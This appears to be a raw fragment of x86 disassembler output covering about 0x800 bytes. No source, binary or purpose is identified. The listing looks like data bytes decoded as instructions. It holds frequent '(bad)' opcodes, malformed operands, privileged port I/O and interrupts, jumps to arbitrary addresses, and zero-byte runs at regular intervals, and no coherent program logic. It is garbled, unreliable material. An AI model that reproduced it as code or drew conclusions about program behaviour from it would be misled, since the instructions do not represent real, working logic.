  4220a2:	and    BYTE PTR [edi],0x2d
  4220a5:	les    eax,FWORD PTR ds:[edi-0x6]
  4220a9:	cmp    BYTE PTR [eax],bl
  4220ab:	dec    eax
  4220ac:	pop    ebx
  4220ad:	sub    al,0x7e
  4220af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4220b0:	jge    0x422081
  4220b2:	adc    al,0xf9
  4220b4:	test   DWORD PTR [ecx+eax*4-0x7f0e0e8d],edx
  4220bb:	out    0x79,eax
  4220bd:	sbb    eax,0x2d1fe72d
  4220c2:	inc    ecx
  4220c3:	push   cs
  4220c4:	int3   
  4220c5:	push   esp
  4220c6:	jecxz  0x4220cd
  4220c8:	xchg   BYTE PTR [ebx],bh
  4220ca:	in     al,dx
  4220cb:	in     eax,0x20
  4220cd:	xor    BYTE PTR [esp+eax*4-0x785b485b],ah
  4220d4:	ret    0x63e2
  4220d7:	inc    edi
  4220d8:	jno    0x4220ea
  4220da:	aaa    
  4220db:	inc    esp
  4220dc:	pop    ecx
  4220dd:	iret   
  4220de:	dec    eax
  4220df:	mov    al,ds:0xb8eb77a3
  4220e4:	mov    dl,0xe2
  4220e6:	adc    esp,edi
  4220e8:	repnz lds eax,FWORD PTR [eax-0x2]
  4220ec:	push   edi
  4220ed:	mov    eax,ds:0xc1599097
  4220f2:	(bad)  
  4220f3:	cmp    BYTE PTR [ebx-0x36],0x12
  4220f7:	add    BYTE PTR [eax],al
  4220f9:	add    BYTE PTR [eax],al
  4220fb:	add    BYTE PTR [eax],al
  4220fd:	add    cl,ch
  4220ff:	mov    ecx,0xf37a307a
  422104:	jmp    0x4220ff
  422106:	fimul  DWORD PTR [esp+eax*2+0x6c]
  42210a:	add    edx,DWORD PTR [edx-0x26e0bdc1]
  422110:	add    DWORD PTR [eax],eax
  422112:	popa   
  422113:	add    BYTE PTR [eax],al
  422115:	add    BYTE PTR [edx+0x15ab040],ch
  42211b:	pop    ds
  42211c:	sar    DWORD PTR [esi-0x3923860c],1
  422122:	and    esi,DWORD PTR [ebx-0x1b280e18]
  422128:	xor    DWORD PTR [eax+0x6f],eax
  42212b:	inc    esi
  42212c:	stos   BYTE PTR es:[edi],al
  42212d:	mov    esi,0xa008cf06
  422132:	cmp    eax,0x6793de20
  422137:	pop    esp
  422138:	call   0x9dbac12b
  42213d:	mov    ch,0x5d
  42213f:	adc    al,bl
  422141:	repz inc ecx
  422143:	add    ebp,DWORD PTR [esi-0x7a051d1d]
  422149:	mov    edx,0xef356f4c
  42214e:	hlt    
  42214f:	enter  0x5431,0x50
  422153:	mov    edi,0xabbfe37c
  422158:	mov    BYTE PTR [eax+0x1451efeb],al
  42215e:	(bad)  
  42215f:	jnp    0x42217d
  422161:	data16 into 
  422163:	or     eax,0x57e575b9
  422168:	leave  
  422169:	push   ecx
  42216a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42216b:	fmulp  st(7),st
  42216d:	mov    eax,ds:0xd9029137
  422172:	aas    
  422173:	fnsave [edx-0x11]
  422176:	jmp    0x0:0x0
  42217d:	add    BYTE PTR [ebx+0x41],bl
  422180:	pop    ebx
  422181:	iret   
  422182:	pop    ebx
  422183:	(bad)  
  422185:	aad    0xf
  422187:	ss dec esp
  422189:	dec    esi
  42218a:	das    
  42218b:	cmp    ebp,DWORD PTR cs:0x1d980
  422192:	popa   
  422193:	add    BYTE PTR [eax],al
  422195:	add    BYTE PTR [esi+0x4bdb1713],al
  42219b:	sbb    al,0x6f
  42219d:	lds    ecx,FWORD PTR [esp+ebx*1+0x29]
  4221a1:	fild   DWORD PTR [edi-0x21]
  4221a4:	call   0x372e186e
  4221a9:	cmp    DWORD PTR [ebx],edx
  4221ab:	xor    ecx,DWORD PTR [edx]
  4221ad:	mov    dl,0x6c
  4221af:	xor    ah,ah
  4221b1:	imul   edx,DWORD PTR [ecx+0x65],0xd
  4221b5:	inc    edi
  4221b6:	or     bh,BYTE PTR [eax+0x7e]
  4221b9:	popf   
  4221ba:	ror    ebx,1
  4221bc:	(bad)  
  4221bd:	cmc    
  4221be:	popf   
  4221bf:	icebp  
  4221c0:	push   cs
  4221c1:	lds    ebp,FWORD PTR [ebx-0x64bbd092]
  4221c7:	push   ecx
  4221c8:	inc    esi
  4221c9:	adc    eax,0x146dd57a
  4221ce:	and    al,0x28
  4221d0:	xlat   BYTE PTR ds:[ebx]
  4221d1:	mov    BYTE PTR gs:[ecx-0x43],ch
  4221d5:	addr16 jnp 0x4221f2
  4221d8:	ror    BYTE PTR [esi+0x7dca4408],cl
  4221de:	pop    ebx
  4221df:	test   DWORD PTR [edi-0x73f31ccd],esp
  4221e5:	xchg   dh,cl
  4221e7:	jbe    0x42224b
  4221e9:	adc    eax,0x43f0e49c
  4221ee:	xor    al,0xa1
  4221f0:	test   eax,0x8c7e5dee
  4221f5:	loopne 0x42218f
  4221f7:	add    BYTE PTR [eax],al
  4221f9:	add    BYTE PTR [eax],al
  4221fb:	add    BYTE PTR [eax],al
  4221fd:	add    BYTE PTR [ebx+0x7f3c6585],bl
  422203:	cld    
  422204:	(bad)  [edi-0x65be08a1]
  42220a:	ins    DWORD PTR es:[edi],dx
  42220b:	(bad)  
  42220c:	ins    BYTE PTR es:[edi],dx
  42220d:	xor    al,0xe1
  42220f:	fld    DWORD PTR [ecx]
  422211:	add    BYTE PTR [ecx+0x0],ah
  422214:	add    BYTE PTR [eax],al
  422216:	xchg   DWORD PTR [edi],ebp
  422218:	aas    
  422219:	aam    0x23
  42221b:	in     al,dx
  42221c:	outs   dx,BYTE PTR ds:[esi]
  42221d:	add    edx,DWORD PTR [edx+0xb28b253]
  422223:	jecxz  0x4221c8
  422225:	test   al,0x65
  422227:	dec    ecx
  422228:	xchg   ebp,eax
  422229:	pop    ds
  42222a:	outs   dx,DWORD PTR ds:[esi]
  42222b:	mov    dl,0x10
  42222d:	or     dl,BYTE PTR [ecx-0x17263967]
  422233:	mov    ah,0xa5
  422235:	je     0x422290
  422237:	fbld   TBYTE PTR [ecx+0x34]
  42223a:	dec    edi
  42223b:	in     eax,0x8e
  42223d:	jne    0x422200
  42223f:	inc    ebx
  422240:	int3   
  422241:	sub    al,0x96
  422243:	imul   ebp,DWORD PTR [ebx+eax*1-0x7419521f],0xfffffffe
  42224b:	jmp    0x422225
  42224d:	dec    ebp
  42224e:	fs mov edi,0xd4843ce4
  422254:	leave  
  422255:	push   edi
  422256:	xchg   ebx,eax
  422257:	mov    esi,0xd204c006
  42225c:	cmp    eax,0xe17b2f4a
  422261:	sbb    ebp,DWORD PTR [ebx+0x3818530b]
  422267:	repz add al,0x89
  42226a:	clc    
  42226b:	stos   BYTE PTR es:[edi],al
  42226c:	push   ss
  42226d:	repz test al,0xcf
  422270:	jge    0x422235
  422272:	cld    
  422273:	mov    bl,0xf4
  422275:	test   DWORD PTR [edx+0x0],ebx
  42227b:	add    BYTE PTR [eax],al
  42227d:	add    BYTE PTR [esi+0x73],ch
  422280:	lock retf 0xcbfd
  422284:	jle    0x42227d
  422286:	repz xor eax,0xabd58ce9
  42228c:	fst    QWORD PTR [edx+0x1da42]
  422292:	popa   
  422293:	add    BYTE PTR [eax],al
  422295:	add    al,dl
  422297:	mov    ch,0x7
  422299:	adc    al,0x1b
  42229b:	ds gs es cmc 
  42229f:	mov    eax,0xc1b05363
  4222a4:	mov    ebx,DWORD PTR [edi]
  4222a6:	adc    DWORD PTR [esi+0x6621b41],esp
  4222ac:	lahf   
  4222ad:	mov    eax,0xa381febe
  4222b2:	xchg   esp,eax
  4222b3:	loopne 0x42231f
  4222b5:	sti    
  4222b6:	call   DWORD PTR [eax-0xe]
  4222b9:	xchg   BYTE PTR [eax+0x5dbe39c1],al
  4222bf:	jecxz  0x422269
  4222c1:	xor    edx,DWORD PTR ds:[edi-0x14]
  4222c5:	out    dx,al
  4222c6:	scas   eax,DWORD PTR es:[edi]
  4222c7:	into   
  4222c8:	je     0x4222c9
  4222ca:	xchg   ebp,eax
  4222cb:	or     al,bl
  4222cd:	mov    cl,0xb
  4222cf:	pop    esi
  4222d0:	and    eax,0x63245d4c
  4222d5:	adc    ah,bh
  4222d7:	fidivr DWORD PTR ds:0x8f84d882
  4222dd:	cs push 0x1e547c7a
  4222e3:	mov    esp,0x8b7352ed
  4222e8:	or     ch,BYTE PTR [ecx+ebx*1]
  4222eb:	call   DWORD PTR [eax+0x38]
  4222ee:	out    0xad,al
  4222f0:	js     0x4222c6
  4222f2:	mov    edi,0x539a68ce
  4222f7:	add    BYTE PTR [eax],al
  4222f9:	add    BYTE PTR [eax],al
  4222fb:	add    BYTE PTR [eax],al
  4222fd:	add    ch,dh
  4222ff:	adc    al,0xae
  422301:	adc    ebp,edi
  422303:	mov    ebx,0x84e6f6fd
  422308:	lds    ebp,FWORD PTR [edx+0x5633855c]
  42230e:	mov    ds:0x610001da,eax
  422313:	add    BYTE PTR [eax],al
  422315:	add    BYTE PTR [ebx],dh
  422317:	cmp    ecx,DWORD PTR [si+0x2f5a]
  42231c:	daa    
  42231d:	loopne 0x422334
  42231f:	adc    al,0x95
  422321:	mov    eax,DWORD PTR [eax-0x59982b13]
  422327:	push   cs
  422328:	mov    ?,ebp
  42232a:	and    al,0xa
  42232c:	jo     0x422353
  42232e:	mov    dl,0xf9
  422330:	cmp    al,0xee
  422332:	rcr    DWORD PTR [ecx],0xc4
  422335:	xchg   esp,eax
  422336:	mov    WORD PTR [ecx],ss
  422338:	sbb    eax,0x990bd740
  42233d:	hlt    
  42233e:	mov    BYTE PTR [ecx-0x5e],ch
  422341:	(bad)  
  422342:	jl     0x4222d6
  422344:	shl    BYTE PTR [ebx+esi*8-0x6520ca5b],cl
  42234b:	stos   BYTE PTR es:[edi],al
  42234c:	mov    edx,0xb6b9ac71
  422351:	mov    DWORD PTR [edx],ebx
  422353:	test   BYTE PTR [eax+0x5c],bh
  422356:	sbb    al,0xf9
  422358:	jbe    0x4223a9
  42235a:	inc    eax
  42235b:	pop    ecx
  42235c:	retf   0x76a7
  42235f:	stos   DWORD PTR es:[edi],eax
  422360:	cmp    eax,0xd87c2b6f
  422365:	ds nop
  422367:	sub    al,0x46
  422369:	add    ecx,0xffffffeb
  42236c:	scas   eax,DWORD PTR es:[edi]
  42236d:	xor    ebx,esi
  42236f:	in     al,0xc6
  422371:	fidivr DWORD PTR [esi+esi*4+0x68e63e]
  422378:	add    BYTE PTR [eax],al
  42237a:	add    BYTE PTR [eax],al
  42237c:	add    BYTE PTR [eax],al
  42237e:	cmp    esi,DWORD PTR [ecx-0x9200fa9]
  422384:	mov    edi,0xbb1c16fb
  422389:	rcr    BYTE PTR [edx],0x7d
  42238c:	rol    BYTE PTR [esp+eax*1-0x25],1
  422390:	add    DWORD PTR [eax],eax
  422392:	popa   
  422393:	add    BYTE PTR [eax],al
  422395:	add    BYTE PTR ds:0xa171b5e5,dh
  42239b:	unpcklps xmm5,XMMWORD PTR [eax]
  42239e:	mov    DWORD PTR [ecx-0x2184f33c],esi
  4223a4:	dec    ecx
  4223a5:	stc    
  4223a6:	sub    bh,dh
  4223a8:	pushw  0x997f
  4223ac:	and    BYTE PTR [edi+0x4b],0xea
  4223b0:	jns    0x422409
  4223b2:	inc    esp
  4223b3:	mov    ds:0x5eb2affc,eax
  4223b8:	sub    BYTE PTR [ecx+0x2],0x91
  4223bc:	mov    ?,WORD PTR [edx-0x220d5ab7]
  4223c2:	sahf   
  4223c3:	push   edx
  4223c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223c5:	hlt    
  4223c6:	mov    ds:0xcb0b8aee,al
  4223cb:	add    ebx,DWORD PTR [ecx+0x3f]
  4223ce:	or     DWORD PTR [edx+0xbbf26c1],esi
  4223d4:	pop    esp
  4223d5:	test   DWORD PTR [ebx+0x79efea24],ecx
  4223db:	and    eax,0x62dcf5c7
  4223e0:	push   eax
  4223e1:	jle    0x422419
  4223e3:	mov    dh,0xfb
  4223e5:	aas    
  4223e6:	inc    esi
  4223e7:	dec    ebx
  4223e8:	or     DWORD PTR [edi+0x77],ebp
  4223eb:	inc    ecx
  4223ec:	pop    ebp
  4223ed:	mov    WORD PTR [ecx+ecx*1-0x327191f6],fs
  4223f4:	sbb    eax,0x14e8
  4223f9:	add    BYTE PTR [eax],al
  4223fb:	add    BYTE PTR [eax],al
  4223fd:	add    ah,dl
  4223ff:	sqrtps xmm6,xmm0
  422402:	(bad)  
  422404:	cmc    
  422405:	das    
  422406:	sbb    BYTE PTR [eax],cl
  422408:	xchg   ebx,eax
  422409:	iret   
  42240a:	xlat   BYTE PTR ds:[ebx]
  42240b:	jl     0x4223ef
  42240d:	xor    DWORD PTR [ebp-0x25],esp
  422410:	add    DWORD PTR [eax],eax
  422412:	popa   
  422413:	add    BYTE PTR [eax],al
  422415:	add    BYTE PTR [esi+0x18],al
  422418:	dec    edi
  422419:	adc    eax,0xe9c88aab
  42241e:	mov    ebx,0xa15a5708
  422423:	push   ebx
  422424:	push   esi
  422425:	loope  0x4224a0
  422427:	sbb    ebp,DWORD PTR [ecx+0x1d]
  42242a:	mov    ebp,0x439628f4
  42242f:	arpl   bx,ax
  422431:	popa   
  422432:	sar    BYTE PTR [eax],1
  422434:	adc    ebp,DWORD PTR [eax]
  422436:	mov    esi,0x9dabe634
  42243b:	jae    0x422429
  42243d:	dec    eax
  42243e:	ja     0x42241b
  422440:	cmp    bh,0xa3
  422443:	mov    al,0x7f
  422445:	mov    dh,0xd5
  422447:	test   al,0xa0
  422449:	daa    
  42244a:	or     DWORD PTR [eax-0x3e],edi
  42244d:	pop    ecx
  42244e:	clc    
  42244f:	xchg   edi,eax
  422450:	xor    bh,BYTE PTR [ecx]
  422452:	cmp    al,dl
  422454:	adc    DWORD PTR [eax],edi
  422456:	mov    ah,0xa4
  422458:	jmp    0x2c60179c
  42245d:	push   ebp
  42245e:	mov    edx,ecx
  422460:	popf   
  422461:	xor    al,0xe8
  422463:	mov    dh,0x8f
  422465:	add    al,BYTE PTR [edx-0x10de26ed]
  42246b:	dec    esp
  42246c:	jecxz  0x4223f8
  42246e:	vdivsd xmm4,xmm0,QWORD PTR [ecx*4-0x4258c5ec]
  422477:	add    BYTE PTR [eax],al
  422479:	add    BYTE PTR [eax],al
  42247b:	add    BYTE PTR [eax],al
  42247d:	add    ch,cl
  42247f:	sub    eax,0xfbf54395
  422484:	fild   QWORD PTR [edi-0x5bdf5fa9]
  42248a:	scas   al,BYTE PTR es:[edi]
  42248b:	mov    bl,0xbc
  42248d:	ja     0x422455
  42248f:	fild   DWORD PTR [ecx]
  422491:	add    BYTE PTR [ecx+0x0],ah
  422494:	add    BYTE PTR [eax],al
  422496:	adc    ebx,DWORD PTR [eax]
  422498:	mov    esi,DWORD PTR [ebx+edx*8+0x27a82e45]
  42249f:	out    0xf1,al
  4224a1:	popa   
  4224a2:	dec    ebp
  4224a3:	push   ebp
  4224a4:	cmp    eax,0x5897cd0b
  4224a9:	cs daa 
  4224ab:	fwait
  4224ac:	push   cs
  4224ad:	mov    ebx,0xd28edbb5
  4224b2:	mov    eax,ds:0x9eb324ca
  4224b7:	adc    al,0x7a
  4224b9:	jnp    0x42250f
  4224bb:	ins    DWORD PTR es:[edi],dx
  4224bc:	xor    BYTE PTR [ecx+0x1ecd78cc],ch
  4224c2:	imul   edi,esi,0xffffffbe
  4224c5:	call   0x1ab59079
  4224ca:	frstor [edx-0xa]
  4224cd:	sbb    bl,BYTE PTR [ecx+0x1d886938]
  4224d3:	imul   esp,DWORD PTR [ecx+0x5243c87e],0xb85ae47e
  4224dd:	dec    edx
  4224de:	outs   dx,BYTE PTR ds:[esi]
  4224df:	dec    esi
  4224e0:	mov    dl,0x4c
  4224e2:	sub    ah,bh
  4224e4:	xor    bl,bl
  4224e6:	lea    esp,[edi]
  4224e8:	bound  esi,QWORD PTR [esi]
  4224ea:	lock jno 0x4224b7
  4224ed:	and    al,0xc2
  4224ef:	leave  
  4224f0:	sub    edi,eax
  4224f2:	ins    BYTE PTR es:[edi],dx
  4224f3:	or     esi,DWORD PTR [ebx+0x9fa5]
  4224f9:	add    BYTE PTR [eax],al
  4224fb:	add    BYTE PTR [eax],al
  4224fd:	add    BYTE PTR [ebx],dl
  4224ff:	fs out 0xb,eax
  422502:	test   DWORD PTR [ebx-0xce58301],0xfac64cfc
  42250c:	cli    
  42250d:	daa    
  42250e:	daa    
  42250f:	fadd   QWORD PTR [ecx]
  422511:	add    BYTE PTR [ecx+0x0],ah
  422514:	add    BYTE PTR [eax],al
  422516:	ror    BYTE PTR [edx-0x63c8cde9],1
  42251c:	sub    eax,0x4162253b
  422521:	jge    0x4224c2
  422523:	cld    
  422524:	sbb    bh,BYTE PTR [ecx]
  422526:	mov    ebx,0xaa709c40
  42252b:	add    bl,0x71
  42252e:	ret    
  42252f:	sub    al,BYTE PTR [eax+0x4ccc23c4]
  422535:	xor    dl,ch
  422537:	icebp  
  422538:	enter  0xbd9d,0x89
  42253c:	inc    ecx
  42253d:	test   BYTE PTR [eax],ah
  42253f:	enter  0x80e6,0xf1
  422543:	sahf   
  422544:	xchg   ebx,eax
  422545:	lods   eax,DWORD PTR ds:[esi]
  422546:	(bad)
  42254a:	mov    esp,0x61e54349
  42254f:	push   edx
  422550:	fs cmp esp,edx
  422553:	scas   eax,DWORD PTR es:[edi]
  422554:	stc    
  422555:	dec    ebx
  422556:	xchg   ebp,eax
  422557:	ret    
  422558:	lock lahf 
  42255a:	xor    DWORD PTR [ebx+ecx*2-0x3123f76a],0xba74d836
  422565:	out    dx,al
  422566:	leave  
  422567:	int    0x62
  422569:	outs   dx,DWORD PTR ds:[esi]
  42256a:	xchg   ebx,eax
  42256b:	repnz (bad) 
  42256d:	dec    ebx
  42256e:	mov    al,ds:0xceae0218
  422573:	inc    ebx
  422574:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422575:	add    BYTE PTR [edx+0x0],ch
  422578:	add    BYTE PTR [eax],al
  42257a:	add    BYTE PTR [eax],al
  42257c:	add    BYTE PTR [eax],al
  42257e:	daa    
  42257f:	push   ecx
  422580:	imul   esi,DWORD PTR [ecx-0x28004681],0x8274b3d8
  42258a:	hlt    
  42258b:	sbb    DWORD PTR [esi-0x7b],0xffffff88
  42258f:	fadd   QWORD PTR [ecx]
  422591:	add    BYTE PTR [ecx+0x0],ah
  422594:	add    BYTE PTR [eax],al
  422596:	imul   esp,DWORD PTR [edx-0x66e514fc],0x7a
  42259d:	fs xchg edi,eax
  42259f:	out    dx,eax
  4225a0:	inc    ecx
  4225a1:	adc    cl,cl
  4225a3:	fwait
  4225a4:	push   esi
  4225a5:	adc    ebx,ebx
  4225a7:	mov    dh,0xc
  4225a9:	int    0x80
  4225ab:	pushf  
  4225ac:	inc    edx
  4225ad:	dec    ebx
  4225ae:	repz pop eax
  4225b0:	xor    BYTE PTR [ebx+0x74],ch
  4225b3:	jmp    0x4225b8
  4225b5:	adc    eax,0x1f173239
  4225ba:	jae    0x4225dd
  4225bc:	aad    0xe8
  4225be:	xchg   edx,eax
  4225bf:	mov    ecx,0xa6101d26
  4225c4:	loopne 0x422572
  4225c6:	sub    dh,bh
  4225c8:	in     al,dx
  4225c9:	int    0xda
  4225cb:	xchg   edx,eax
  4225cc:	xlat   BYTE PTR ds:[ebx]
  4225cd:	xor    BYTE PTR [ebx+0x4290c601],0x41
  4225d4:	mov    dl,0x45
  4225d6:	les    esi,FWORD PTR [ebx-0x6885986c]
  4225dc:	in     eax,dx
  4225dd:	shl    DWORD PTR [esi+0x8a34c0f],1
  4225e3:	sub    BYTE PTR [edx],cl
  4225e5:	dec    edx
  4225e6:	test   al,0xe5
  4225e8:	sub    bh,BYTE PTR [edx+0x6a]
  4225eb:	or     DWORD PTR [ebp-0x7278450d],esi
  4225f1:	(bad)  
  4225f2:	jp     0x42257f
  4225f4:	xchg   DWORD PTR [ebx],edi
  4225f6:	add    BYTE PTR ds:[eax],al
  4225f9:	add    BYTE PTR [eax],al
  4225fb:	add    BYTE PTR [eax],al
  4225fd:	add    BYTE PTR [esi],dh
  4225ff:	add    dl,BYTE PTR [ebp+0xc]
  422602:	jne    0x422663
  422604:	jg     0x422640
  422606:	clc    
  422607:	cs aas 
  422609:	push   0xbfa4a6df
  42260e:	in     al,0xce
  422610:	add    DWORD PTR [eax],eax
  422612:	popa   
  422613:	add    BYTE PTR [eax],al
  422615:	add    BYTE PTR [ecx],dl
  422617:	(bad)  
  422618:	sti    
  422619:	add    esi,DWORD PTR [eax]
  42261b:	xchg   edx,eax
  42261c:	mov    ebp,0xc8dfb15b
  422621:	mov    ebp,0xd2066858
  422626:	mov    edi,edi
  422628:	jae    0x4226a9
  42262a:	push   ebx
  42262b:	cdq    
  42262c:	pop    esp
  42262d:	xchg   ebp,eax
  42262e:	scas   al,BYTE PTR es:[edi]
  42262f:	mov    esp,0xb9970414
  422634:	xor    ecx,ebp
  422636:	or     eax,0x353c2616
  42263b:	test   DWORD PTR [ebp+0x5b],edx
  42263e:	inc    eax
  42263f:	repz es mov cl,0xfd
  422643:	stos   BYTE PTR es:[edi],al
  422644:	push   eax
  422645:	jl     0x42268d
  422647:	and    DWORD PTR [edx],0xb23a8844
  42264d:	mov    al,BYTE PTR [edx-0x651c4e40]
  422653:	inc    eax
  422654:	push   edi
  422655:	sbb    ch,bl
  422657:	and    al,0x1d
  422659:	mov    ecx,0x91d64c58
  42265e:	sbb    al,0x4c
  422660:	adc    BYTE PTR [ebp+0x4e],0x14
  422664:	mov    eax,ds:0xd5acbe08
  42266a:	mov    esp,0x71677f25
  42266f:	push   0xf82468d5
  422674:	pop    edx
  422675:	out    0xec,eax
  422677:	add    BYTE PTR [eax],al
  422679:	add    BYTE PTR [eax],al
  42267b:	add    BYTE PTR [eax],al
  42267d:	add    BYTE PTR [eax],cl
  42267f:	mov    cl,0x72
  422681:	cmp    edi,ebx
  422683:	sti    
  422684:	dec    ecx
  422685:	mov    bl,0x94
  422687:	je     0x422660
  422689:	call   0xcf45:0xbfaa6cd1
  422690:	add    DWORD PTR [eax],eax
  422692:	popa   
  422693:	add    BYTE PTR [eax],al
  422695:	add    bl,al
  422697:	push   0xd
  422699:	ins    BYTE PTR es:[edi],dx
  42269a:	(bad)  
  42269b:	pop    esi
  42269c:	in     al,0x57
  42269e:	mov    edx,0xcc07d51e
  4226a3:	int    0xb0
  4226a5:	mov    eax,0x2dd90485
  4226aa:	push   cs
  4226ab:	jecxz  0x4226e6
  4226ad:	or     eax,DWORD PTR [eax+0x19a3eb67]
  4226b3:	xchg   BYTE PTR fs:[ebx-0x15],ah
  4226b7:	add    dh,al
  4226b9:	dec    esi
  4226ba:	outs   dx,BYTE PTR ss:[esi]
  4226bc:	pop    edx
  4226bd:	jge    0x422736
  4226bf:	sbb    ebx,ebp
  4226c1:	in     eax,dx
  4226c2:	pop    esi
  4226c3:	fisub  WORD PTR [ebx]
  4226c5:	je     0x42267a
  4226c7:	dec    ecx
  4226c8:	jb     0x4226c1
  4226ca:	mov    ebx,0x789fd825
  4226cf:	push   0x166f855e
  4226d4:	xor    DWORD PTR [ebx+esi*1+0x61b09197],ecx
  4226db:	or     esp,DWORD PTR [esi]
  4226dd:	dec    ecx
  4226de:	mov    BYTE PTR [edx-0x2c],bl
  4226e1:	int3   
  4226e2:	outs   dx,BYTE PTR ds:[esi]
  4226e3:	test   BYTE PTR [eax+ebx*2-0x33f8b18],0x15
  4226eb:	mov    dl,0x73
  4226ed:	(bad)  
  4226ee:	popa   
  4226ef:	pop    esi
  4226f0:	dec    esi
  4226f1:	sbb    BYTE PTR [edi-0x70],dh
  4226f4:	cs test al,0xbc
  4226f7:	add    BYTE PTR [eax],al
  4226f9:	add    BYTE PTR [eax],al
  4226fb:	add    BYTE PTR [eax],al
  4226fd:	add    bh,bl
  4226ff:	push   ebx
  422700:	mov    dl,0x4f
  422702:	mov    esi,0x67d3ffef
  422707:	xchg   ecx,edi
  422709:	adc    al,0x54
  42270b:	or     edi,DWORD PTR [ebx]
  42270d:	aam    0xa6
  42270f:	iret   
  422710:	add    DWORD PTR [eax],eax
  422712:	popa   
  422713:	add    BYTE PTR [eax],al
  422715:	add    BYTE PTR [ebx+0x5751d56b],dl
  42271b:	sbb    eax,0xbce0e883
  422720:	das    
  422721:	pushf  
  422722:	movaps xmm0,XMMWORD PTR [ebx+0x37]
  422726:	cli    
  422727:	push   ebx
  422728:	aaa    
  422729:	aam    0xfe
  42272b:	mov    ebx,0x5d0d3c4e
  422730:	or     al,0xdf
  422732:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422733:	xor    eax,0xbe708ed9
  422738:	cmp    BYTE PTR [ebx+0x7f36b463],bh
  42273e:	push   es
  42273f:	test   al,0xe6
  422741:	cdq    
  422742:	jb     0x422705
  422744:	enter  0xa0d,0x0
  422748:	test   dh,dl
  42274a:	sub    esi,DWORD PTR [esi-0x14b878b3]
  422750:	out    0x1,eax
  422752:	stos   BYTE PTR es:[edi],al
  422753:	inc    ebx
  422754:	and    bl,BYTE PTR [esi-0x3a]
  422757:	hlt    
  422758:	mov    ecx,es
  42275a:	pop    ds
  42275b:	retf   0xe409
  42275e:	inc    ebx
  42275f:	sbb    eax,0xcf073b5c
  422764:	push   cs
  422765:	push   edi
  422766:	rcr    DWORD PTR [ebp+0x53],cl
  422769:	clc    
  42276a:	cdq    
  42276b:	outs   dx,DWORD PTR ds:[esi]
  42276c:	jmp    0x422729
  42276e:	and    al,0x45
  422770:	popa   
  422771:	test   al,0xb8
  422773:	sub    BYTE PTR [edi-0x5],al
  422776:	fadd   QWORD PTR [eax]
  422778:	add    BYTE PTR [eax],al
  42277a:	add    BYTE PTR [eax],al
  42277c:	add    BYTE PTR [eax],al
  42277e:	xchg   DWORD PTR [ebx+edx*8],ecx
  422781:	fcmovu st,st(3)
  422783:	fisttp WORD PTR [edi+0x640ccb5d]
  422789:	push   ss
  42278a:	xor    al,0x20
  42278c:	jo     0x422720
  42278e:	pop    es
  42278f:	rol    BYTE PTR [ecx],1
  422791:	add    BYTE PTR [ecx+0x0],ah
  422794:	add    BYTE PTR [eax],al
  422796:	xchg   DWORD PTR [edi+0x27],esi
  422799:	xor    bh,cl
  42279b:	cli    
  42279c:	repnz dec ebx
  42279e:	mov    ecx,0x7bd34795
  4227a3:	inc    BYTE PTR [eax+0x60]
  4227a6:	cwde   
  4227a7:	sbb    cl,BYTE PTR [ecx+0x22]
  4227aa:	test   DWORD PTR [ebp-0x777bc214],edi
  4227b0:	jmp    0x8ab8:0xd9c49c67
  4227b7:	sbb    DWORD PTR [ebp+0x38b5c96b],eax
  4227bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227be:	js     0x4227e3
  4227c0:	xchg   esp,eax
  4227c1:	pop    esp
  4227c2:	retf   
  4227c3:	or     al,0xad
  4227c5:	test   BYTE PTR [eax+eax*2],ch
  4227c8:	ret    
  4227c9:	scas   al,BYTE PTR es:[edi]
  4227ca:	scas   eax,DWORD PTR es:[edi]
  4227cb:	aas    
  4227cc:	xchg   edx,eax
  4227cd:	jmp    0x626d:0xa943e171
  4227d4:	sbb    eax,0xd823d4cb
  4227d9:	aad    0x5f
  4227db:	call   0xda17:0x88dcc8a9
  4227e2:	pop    edx
  4227e3:	call   0x2a9a:0x6c095488
  4227ea:	arpl   WORD PTR [edi+0x57],sp
  4227ed:	cmp    DWORD PTR [edi],ebp
  4227ef:	xor    esi,DWORD PTR [eax+0x7a]
  4227f2:	sbb    dl,BYTE PTR [edi]
  4227f4:	sub    ch,BYTE PTR [ebx]
  4227f6:	inc    eax
  4227f7:	add    BYTE PTR [eax],al
  4227f9:	add    BYTE PTR [eax],al
  4227fb:	add    BYTE PTR [eax],al
  4227fd:	add    BYTE PTR [edi-0x28db29d],bl
  422803:	jle    0x4227c4
  422805:	out    dx,eax
  422806:	sbb    edi,esp
  422808:	mov    BYTE PTR [edi+esi*1+0x68927b58],dh
  42280f:	rol    BYTE PTR [ecx],1
  422811:	add    BYTE PTR [ecx+0x0],ah
  422814:	add    BYTE PTR [eax],al
  422816:	mov    dl,0xc3
  422818:	add    esp,DWORD PTR [esi+0x6d7e32d8]
  42281e:	sahf   
  42281f:	mov    ecx,0x6530c0cd
  422824:	pop    ecx
  422825:	adc    BYTE PTR [ecx-0x2b],bh
  422828:	mov    esi,0xccc796f4
  42282d:	dec    ebp
  42282e:	or     BYTE PTR [eax+0x5f7d301f],al
  422834:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422835:	out    dx,eax
  422836:	and    DWORD PTR [edx],eax
  422838:	aam    0xf9
  42283a:	adc    ecx,DWORD PTR [edx+0x43]
  42283d:	loope  0x42289a
  42283f:	test   al,0x30
  422841:	test   ebx,ebp
  422843:	and    DWORD PTR [edi],ebx
  422845:	xor    BYTE PTR [edx-0x63670a33],bl
  42284b:	sbb    al,0x67
  42284d:	lock shl DWORD PTR [edi],cl
  422850:	pop    ds
  422851:	pushf  
  422852:	mov    edx,0x9d4cd57e
  422857:	pop    edx
  422858:	xor    eax,DWORD PTR [edi-0x43323eea]
  42285e:	xor    BYTE PTR [ecx],ah
  422860:	dec    ebp
  422861:	sbb    dl,BYTE PTR [eax]
  422863:	and    DWORD PTR [edx+0x2308da38],esi
  422869:	adc    bl,0x41
  42286c:	pop    ds
  42286d:	test   BYTE PTR [eax+esi*4-0x76],dl
  422871:	loop   0x4228a6
  422873:	inc    ecx
  422874:	shr    DWORD PTR [ecx+0x6d],cl
  422877:	add    BYTE PTR [eax],al
  422879:	add    BYTE PTR [eax],al
  42287b:	add    BYTE PTR [eax],al
  42287d:	add    BYTE PTR [eax+0x23],dh
  422880:	and    eax,0x7c6f7769
